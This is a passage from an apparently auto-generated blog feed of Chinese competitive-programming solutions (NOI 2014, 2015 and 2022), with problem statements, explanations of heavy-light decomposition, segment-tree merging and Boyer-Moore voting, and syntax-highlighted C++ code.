class="string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">        std::<span class="built_in">swap</span>(t[u], t[v]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">pos</span><span class="params">(n * m + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n * m; i++) pos[t[i]] = i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> getX = [m](<span class="type">int</span> a) -&gt; <span class="type">int</span> &#123; <span class="built_in">return</span> (a - <span class="number">1</span>) / m + <span class="number">1</span>; &#125;;</span><br><span class="line">    <span class="keyword">auto</span> getY = [m](<span class="type">int</span> a) -&gt; <span class="type">int</span> &#123; <span class="keyword">return</span> a % m ? a % m : m; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">l</span><span class="params">(n + <span class="number">1</span>, <span class="number">1</span>)</span>, <span class="title">r</span><span class="params">(n + <span class="number">1</span>, m)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n * m; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">getY</span>(pos[i]) &gt;= l[<span class="built_in">getX</span>(pos[i])] &amp;&amp; <span class="built_in">getY</span>(pos[i]) &lt;= r[<span class="built_in">getX</span>(pos[i])]) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="built_in">getX</span>(pos[i]); j++) r[j] = std::<span class="built_in">min</span>(r[j], <span class="built_in">getY</span>(pos[i]));</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="built_in">getX</span>(pos[i]) + <span class="number">1</span>; j &lt;= n; j++) l[j] = std::<span class="built_in">max</span>(l[j], <span class="built_in">getY</span>(pos[i]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>贪心</tag>
        <tag>NOI</tag>
        <tag>2014</tag>
      </tags>
  </entry>
  <entry>
    <title>「NOI 2015」软件包管理器 - 树链剖分</title>
    <url>/noi2015-manager/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2146">洛谷链接</a></p>
<p><a href="https://loj.ac/p/2130">LibreOJ 链接</a></p>
<p>你决定设计你自己的软件包管理器。不可避免地，你要解决软件包之间的依赖问题。如果软件包
<span class="math inline">\(A\)</span> 依赖软件包 <span
class="math inline">\(B\)</span>，那么安装软件包 <span
class="math inline">\(A\)</span> 以前，必须先安装软件包 <span
class="math inline">\(B\)</span>。同时，如果想要卸载软件包 <span
class="math inline">\(B\)</span>，则必须卸载软件包 <span
class="math inline">\(A\)</span>。现在你已经获得了所有的软件包之间的依赖关系。而且，由于你之前的工作，除
<span class="math inline">\(0\)</span>
号软件包以外，在你的管理器当中的软件包都会依赖一个且仅一个软件包，而
<span class="math inline">\(0\)</span>
号软件包不依赖任何一个软件包。依赖关系不存在环（若有 <span
class="math inline">\(m \ (m \geq 2)\)</span> 个软件包<span
class="math inline">\(A_1, A_2, A_3, \ldots ,A_m\)</span>，其中 <span
class="math inline">\(A_1\)</span> 依赖 <span
class="math inline">\(A_2\)</span>，<span
class="math inline">\(A_2\)</span> 依赖 <span
class="math inline">\(A_3\)</span>，<span
class="math inline">\(A_3\)</span> 依赖 <span
class="math inline">\(A_4\)</span>，……，<span
class="math inline">\(A_{m−1}\)</span> 依赖 <span
class="math inline">\(A_m\)</span>，而 <span
class="math inline">\(A_m\)</span> 依赖 <span
class="math inline">\(A_1\)</span>，则称这 <span
class="math inline">\(m\)</span>
个软件包的依赖关系构成环），当然也不会有一个软件包依赖自己。</p>
<p>现在你要为你的软件包管理器写一个依赖解决程序。根据反馈，用户希望在安装和卸载某个软件包时，快速地知道这个操作实际上会改变多少个软件包的安装状态（即安装操作会安装多少个未安装的软件包，或卸载操作会卸载多少个已安装的软件包），你的任务就是实现这个部分。注意，安装一个已安装的软件包，或卸载一个未安装的软件包，都不会改变任何软件包的安装状态，即在此情况下，改变安装状态的软件包数为
<span class="math inline">\(0\)</span>。</p>
<p>对于所有数据，<span class="math inline">\(n \leq 100000, \ q \leq
100000\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题是一个树上问题。由于是对路径上以及子树上的点操作，我们可以想到使用树链剖分解决。我们可以使用可以使用线段树维护每个点是否被安装，以及这条链或子树上安装的软件的数量。</p>
<p>接下来需要解决软件的安装卸载问题。对于安装软件 <span
class="math inline">\(x\)</span>，我们只需要将从根节点到 <span
class="math inline">\(x\)</span>
的这条路径上的所有软件安装即可；对于卸载软件 <span
class="math inline">\(x\)</span>，我们只需要将以 <span
class="math inline">\(x\)</span>
为根节点的子树中的所有软件删除即可。</p>
<p>维护时我们在线段树可处理懒标记 <span
class="math inline">\(-1\)</span>、<span
class="math inline">\(0\)</span>、<span class="math inline">\(1\)</span>
三种值，分别表示无操作、将区间中所有数赋值为 <span
class="math inline">\(0\)</span>、将区间中所有数赋值为 <span
class="math inline">\(1\)</span>。序列中所有数只有 <span
class="math inline">\(0\)</span>、<span class="math inline">\(1\)</span>
两种数，线段树维护区间和即可满足题目要求。</p>
<p>对于记录每次该边的状态，我们只需要在每次操作前先求出已安装的软件数量，然后和操作后的安装软件数量比较即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Chain</span> *chain;</span><br><span class="line">    <span class="type">int</span> size, dfn, depth;</span><br><span class="line">    Node *fa, *ch;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Chain</span> &#123;</span><br><span class="line">    Node *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Chain</span>(Node *top) : <span class="built_in">top</span>(top) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(Node *u, Node *v)</span> </span>&#123;</span><br><span class="line">    u-&gt;e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(u, v));</span><br><span class="line">    v-&gt;e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(v, u));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs1</span><span class="params">(Node *v, Node *fa = <span class="literal">nullptr</span>)</span> </span>&#123;</span><br><span class="line">    v-&gt;size = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Edge &amp;e : v-&gt;e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.t == fa) <span class="keyword">continue</span>;</span><br><span class="line">        e.t-&gt;fa = v;</span><br><span class="line">        e.t-&gt;depth = v-&gt;depth + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">dfs1</span>(e.t, v);</span><br><span class="line">        v-&gt;size += e.t-&gt;size;</span><br><span class="line">        <span class="keyword">if</span> (!v-&gt;ch || v-&gt;ch-&gt;size &lt; e.t-&gt;size) v-&gt;ch = e.t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs2</span><span class="params">(Node *v)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> ts = <span class="number">0</span>;</span><br><span class="line">    v-&gt;dfn = ++ts;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!v-&gt;fa || v != v-&gt;fa-&gt;ch) v-&gt;chain = <span class="keyword">new</span> <span class="built_in">Chain</span>(v);</span><br><span class="line">    <span class="keyword">else</span> v-&gt;chain = v-&gt;fa-&gt;chain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v-&gt;ch) <span class="built_in">dfs2</span>(v-&gt;ch);</span><br><span class="line">    <span class="keyword">for</span> (Edge &amp;e : v-&gt;e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.t-&gt;fa == v &amp;&amp; e.t != v-&gt;ch) &#123;</span><br><span class="line">            <span class="built_in">dfs2</span>(e.t);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">split</span><span class="params">(Node *v)</span> </span>&#123;</span><br><span class="line">    v-&gt;depth = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">dfs1</span>(v);</span><br><span class="line">    <span class="built_in">dfs2</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SegT</span> &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    SegT *lc, *rc;</span><br><span class="line">    <span class="type">int</span> val, tag;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SegT</span>(<span class="type">int</span> l, <span class="type">int</span> r, SegT *lc, SegT *rc) : <span class="built_in">l</span>(l), <span class="built_in">r</span>(r), <span class="built_in">lc</span>(lc), <span class="built_in">rc</span>(rc), <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">tag</span>(<span class="number">-1</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">cover</span><span class="params">(<span class="type">const</span> <span class="type">int</span> delta)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (delta == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">        val = delta == <span class="number">1</span> ? r - l + <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">        tag = delta == <span class="number">1</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pushDown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (tag != <span class="number">-1</span>) &#123;</span><br><span class="line">            lc-&gt;<span class="built_in">cover</span>(tag);</span><br><span class="line">            rc-&gt;<span class="built_in">cover</span>(tag);</span><br><span class="line">            tag = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r, <span class="type">const</span> <span class="type">int</span> delta)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; <span class="keyword">this</span>-&gt;r || r &lt; <span class="keyword">this</span>-&gt;l) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l &lt;= <span class="keyword">this</span>-&gt;l &amp;&amp; r &gt;= <span class="keyword">this</span>-&gt;r) <span class="built_in">cover</span>(delta);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">pushDown</span>();</span><br><span class="line">            lc-&gt;<span class="built_in">update</span>(l, r, delta);</span><br><span class="line">            rc-&gt;<span class="built_in">update</span>(l, r, delta);</span><br><span class="line">            val = lc-&gt;val + rc-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> SegT *<span class="title">build</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; r) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l == r) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SegT</span>(l, r, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">const</span> <span class="type">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SegT</span>(l, r, <span class="built_in">build</span>(l, mid), <span class="built_in">build</span>(mid + <span class="number">1</span>, r));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; *segment;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">update</span><span class="params">(Node *u, Node *v, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (u-&gt;chain != v-&gt;chain) &#123;</span><br><span class="line">        <span class="keyword">if</span> (u-&gt;chain-&gt;top-&gt;depth &lt; v-&gt;chain-&gt;top-&gt;depth) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">        segment-&gt;<span class="built_in">update</span>(u-&gt;chain-&gt;top-&gt;dfn, u-&gt;dfn, w);</span><br><span class="line">        u = u-&gt;chain-&gt;top-&gt;fa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (u-&gt;depth &gt; v-&gt;depth) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">    segment-&gt;<span class="built_in">update</span>(u-&gt;dfn, v-&gt;dfn, w);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;Node&gt; <span class="title">nodes</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> p;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;p);</span><br><span class="line">        <span class="built_in">addEdge</span>(&amp;nodes[p], &amp;nodes[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">split</span>(&amp;nodes[<span class="number">0</span>]);</span><br><span class="line">    segment = SegT::<span class="built_in">build</span>(<span class="number">1</span>, n);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q);</span><br><span class="line">    <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">        <span class="type">char</span> op[<span class="built_in">sizeof</span>(<span class="string">&quot;uninstall&quot;</span>)];</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s %d&quot;</span>, op, &amp;x);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> bef = segment-&gt;val;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;i&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">update</span>(&amp;nodes[<span class="number">0</span>], &amp;nodes[x], <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, segment-&gt;val - bef);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;u&#x27;</span>) &#123;</span><br><span class="line">            segment-&gt;<span class="built_in">update</span>(nodes[x].dfn, nodes[x].dfn + nodes[x].size - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, bef - segment-&gt;val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数据结构</tag>
        <tag>树</tag>
        <tag>线段树</tag>
        <tag>树链剖分</tag>
      </tags>
  </entry>
  <entry>
    <title>「NOI 2022」众数 - 线段树合并 + 链表</title>
    <url>/noi2022-major/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P8496">洛谷链接</a></p>
<p><a href="https://loj.ac/p/3847">LibreOJ 链接</a></p>
<p><strong>对于一个序列，定义其众数为序列中出现次数严格大于一半的数字。注意该定义与一般的定义有出入，在本题中请以题面中给出的定义为准。</strong></p>
<p>一开始给定 <span class="math inline">\(n\)</span>
个长度不一的正整数序列，编号为 <span class="math inline">\(1 \sim
n\)</span>，初始序列可以为空。这 <span class="math inline">\(n\)</span>
个序列被视为存在，其他编号对应的序列视为不存在。</p>
<p>有 <span class="math inline">\(q\)</span> 次操作，操作有以下类型:</p>
<ul>
<li><span class="math inline">\(1 \ x \ y\)</span>：在 <span
class="math inline">\(x\)</span> 号序列末尾插入数字 <span
class="math inline">\(y\)</span>。保证 <span
class="math inline">\(x\)</span> 号序列存在，且 <span
class="math inline">\(1 \le x, y \le n + q\)</span>。</li>
<li><span class="math inline">\(2 \ x\)</span>：删除 <span
class="math inline">\(x\)</span> 号序列末尾的数字，保证 <span
class="math inline">\(x\)</span> 号序列存在、非空，且 <span
class="math inline">\(1 \le x \le n + q\)</span>。</li>
<li><span class="math inline">\(3 \ m \ x_1 \ x_2 \ x_m\)</span>：将
<span class="math inline">\(x_1, x_2, \ldots, x_m\)</span>
号序列顺次拼接，得到一个新序列，并询问其众数。如果不存在满足上述条件的数，则返回
<span class="math inline">\(-1\)</span>。数据保证对于任意 <span
class="math inline">\(1 \le i \le m\)</span>，<span
class="math inline">\(x_i\)</span> 是一个仍然存在的序列，<span
class="math inline">\(1 \le x_i \le n +
q\)</span>，且拼接得到的序列非空。<strong>注意：不保证 <span
class="math inline">\(\boldsymbol{x_1, \ldots, x_m}\)</span>
互不相同，询问中的合并操作不会对后续操作产生影响。</strong></li>
<li><span class="math inline">\(4 \ x_1 \ x_2 \
x_3\)</span>：新建一个编号为 <span class="math inline">\(x_3\)</span>
的序列，其为 <span class="math inline">\(x_1\)</span> 号序列后顺次添加
<span class="math inline">\(x_2\)</span>
号序列中数字得到的结果，然后删除 <span class="math inline">\(x_1,
x_2\)</span> 对应的序列。此时序列 <span
class="math inline">\(x_3\)</span> 视为存在，而序列 <span
class="math inline">\(x_1, x_2\)</span>
被视为不存在，在后续操作中也不会被再次使用。保证 <span
class="math inline">\(1 \le x_1, x_2, x_3 \le n + q\)</span>、<span
class="math inline">\(x_1 \ne x_2\)</span>、序列 <span
class="math inline">\(x_1, x_2\)</span>
在操作前存在、且在操作前没有序列使用过编号 <span
class="math inline">\(x_3\)</span>。</li>
</ul>
<p>假定 <span class="math inline">\(C_l = \sum l_i\)</span>
代表输入序列长度之和，<span class="math inline">\(C_m = \sum m\)</span>
代表所有操作 <span class="math inline">\(3\)</span>
需要拼接的序列个数之和；对于所有测试数据，保证 <span
class="math inline">\(1 \le n, q, C_m, C_l \le 5 \times
{10}^5\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题显然是一道数据结构题。对于序列的插入、删除和拼接，我们可以用
<code>std::list</code>
链表完成。对于每个序列的众数，我们可以对每个序列都开一颗线段树，统计序列众数。由于不确定序列长度，我们可以使用权值线段树
+
动态开点解决。权值线段树维护区间最大值及最大值的下标，即众数的出现次数和众数的下标。对于序列合并操作可用线段树合并解决。</p>
<p>接下来我们需要解决查询操作。对于查询操作我们直接新建线段树然后用线段树合并会
TLE，实际得分 80pts，于是我们需要寻找更优的方法。</p>
<p>对于寻找本题中的众数（我们将其定义为绝对众数），我们可以用
<strong>摩尔投票</strong>
解决。对于一个拥有绝对众数的序列，我们不停地消去序列中两个不同的数，最后剩下的一个数或多个相同的数即为这个序列的绝对众数（而对于不一定有绝对众数的序列，最终答案需带回检验），这种方法叫做摩尔投票。同时我们可以发现，对于多个序列总共的绝对众数，<strong>摩尔投票具有结合律</strong>，即我们将每个序列进行摩尔投票剩下来的数一起再进行一次摩尔投票，得到的结果即为所有序列总共的绝对众数。</p>
<p>接下来我们就可以用摩尔投票解决查询操作：我们先新建一个空序列 <span
class="math inline">\(\text{res}\)</span>，然后遍历每个询问的序列（每个序列的绝对众数可用先线段树查询众数，然后将二倍众数出现次数与序列长度比较即可得出）：</p>
<ul>
<li>若没有绝对众数，则这个序列对答案没有贡献，跳过；</li>
<li>若有绝对众数，则通过众数出现次数及序列长度算出这个序列进行摩尔投票的结果
<span class="math inline">\(\text{now}\)</span>，然后将 <span
class="math inline">\(\text{res}\)</span> 和 <span
class="math inline">\(\text{now}\)</span> 进行摩尔投票，结果存储于 <span
class="math inline">\(\text{res}\)</span>。</li>
</ul>
<p>这样我们就得出了这些序列的可能的绝对众数 <span
class="math inline">\(p\)</span>。接下来再遍历一遍询问的序列，用线段树统计
<span class="math inline">\(p\)</span> 的出现次数，最后再将二倍 <span
class="math inline">\(p\)</span>
的出现次数与这些序列的总长度比较即可得出 <span
class="math inline">\(p\)</span> 是否为这些序列总共的绝对众数。</p>
<p>时间复杂度为 <span class="math inline">\(O(n \log n)\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">5e5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SegT</span> &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    SegT *lc, *rc;</span><br><span class="line">    std::pair&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt; val;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SegT</span>(<span class="type">int</span> l, <span class="type">int</span> r, SegT *lc, SegT *rc) : <span class="built_in">l</span>(l), <span class="built_in">r</span>(r), <span class="built_in">lc</span>(lc), <span class="built_in">rc</span>(rc), <span class="built_in">val</span>(std::<span class="built_in">make_pair</span>(<span class="number">0</span>, <span class="number">0</span>)) &#123;&#125;</span><br><span class="line">    <span class="built_in">SegT</span>(<span class="type">int</span> l, <span class="type">int</span> r, SegT *lc, SegT *rc, std::pair&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt; val) : <span class="built_in">l</span>(l), <span class="built_in">r</span>(r), <span class="built_in">lc</span>(lc), <span class="built_in">rc</span>(rc), <span class="built_in">val</span>(val) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> SegT *<span class="title">build</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; r) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l == r) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SegT</span>(l, r, <span class="literal">NULL</span>, <span class="literal">NULL</span>, std::<span class="built_in">make_pair</span>(<span class="number">0</span>, l));</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SegT</span>(l, r, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">const</span> <span class="type">int</span> pos, <span class="type">const</span> <span class="type">long</span> <span class="type">long</span> delta)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pos &gt; <span class="keyword">this</span>-&gt;r || pos &lt; <span class="keyword">this</span>-&gt;l) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pos == <span class="keyword">this</span>-&gt;l &amp;&amp; pos == <span class="keyword">this</span>-&gt;r) val.first += delta;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (pos &lt;= mid) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!lc) lc = <span class="built_in">build</span>(l, mid);</span><br><span class="line">                lc-&gt;<span class="built_in">update</span>(pos, delta);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!rc) rc = <span class="built_in">build</span>(mid + <span class="number">1</span>, r);</span><br><span class="line">                rc-&gt;<span class="built_in">update</span>(pos, delta);</span><br><span class="line">            &#125;</span><br><span class="line">            std::pair&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt; res = std::<span class="built_in">make_pair</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (lc) res = std::<span class="built_in">max</span>(res, lc-&gt;val);</span><br><span class="line">            <span class="keyword">if</span> (rc) res = std::<span class="built_in">max</span>(res, rc-&gt;val);</span><br><span class="line">            val = res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::pair&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt; <span class="title">query</span><span class="params">(<span class="type">const</span> <span class="type">int</span> pos)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pos &gt; <span class="keyword">this</span>-&gt;r || pos &lt; <span class="keyword">this</span>-&gt;l) <span class="keyword">return</span> std::<span class="built_in">make_pair</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>-&gt;l == <span class="keyword">this</span>-&gt;r) <span class="keyword">return</span> val;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            std::pair&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt; res = std::<span class="built_in">make_pair</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (lc) res = std::<span class="built_in">max</span>(res, lc-&gt;<span class="built_in">query</span>(pos));</span><br><span class="line">            <span class="keyword">if</span> (rc) res = std::<span class="built_in">max</span>(res, rc-&gt;<span class="built_in">query</span>(pos));</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> SegT *<span class="title">merge</span><span class="params">(SegT *u, SegT *v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!u) <span class="keyword">return</span> v;</span><br><span class="line">        <span class="keyword">if</span> (!v) <span class="keyword">return</span> u;</span><br><span class="line">        SegT *w = <span class="built_in">build</span>(u-&gt;l, u-&gt;r);</span><br><span class="line">        <span class="keyword">if</span> (w-&gt;l == w-&gt;r) &#123;</span><br><span class="line">            w-&gt;val.first = u-&gt;val.first + v-&gt;val.first;</span><br><span class="line">            <span class="keyword">return</span> w;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        w-&gt;lc = <span class="built_in">merge</span>(u-&gt;lc, v-&gt;lc);</span><br><span class="line">        w-&gt;rc = <span class="built_in">merge</span>(u-&gt;rc, v-&gt;rc);</span><br><span class="line">        std::pair&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt; res = std::<span class="built_in">make_pair</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (w-&gt;lc) res = std::<span class="built_in">max</span>(res, w-&gt;lc-&gt;val);</span><br><span class="line">        <span class="keyword">if</span> (w-&gt;rc) res = std::<span class="built_in">max</span>(res, w-&gt;rc-&gt;val);</span><br><span class="line">        w-&gt;val = res;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; *segment[<span class="number">2</span> * MAXN + <span 